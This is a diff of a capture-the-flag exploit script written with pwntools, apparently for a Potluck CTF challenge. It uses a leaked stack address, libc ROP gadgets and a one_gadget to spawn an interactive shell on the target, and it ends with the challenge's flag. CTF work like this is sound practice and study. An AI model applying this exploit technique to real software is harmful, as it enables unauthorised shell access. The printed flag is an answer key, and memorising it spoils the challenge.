@@ -106,7 +106,7 @@ offset = 0x1ff38
 stack_leak = int(io.recv(12), 16)
 info(f'stack leak: {hex(stack_leak)}')
 
-# write /bin/sh and ret to a one_gadget
+# ret to a one_gadget
 
 """
 libc
@@ -123,7 +123,7 @@ pop_rsp = 0x0000000000035732
 one_gadget = 0xebcf8
 
 
-io.sendline(b'/bin/sh\x00' + p64(stack_leak)*0x4 + p64(libc.address + pop_rsi) + p64(0) + p64(libc.address + pop_rdx) + p64(0) + p64(0) + p64(libc.address + one_gadget))
+io.sendline(p64(stack_leak)*0x5 + p64(libc.address + pop_rsi) + p64(0) + p64(libc.address + pop_rdx) + p64(0) + p64(0) + p64(libc.address + one_gadget))
 io.interactive()
 
 # potluck{fba7f22d5125950fe906d152df039a5a}
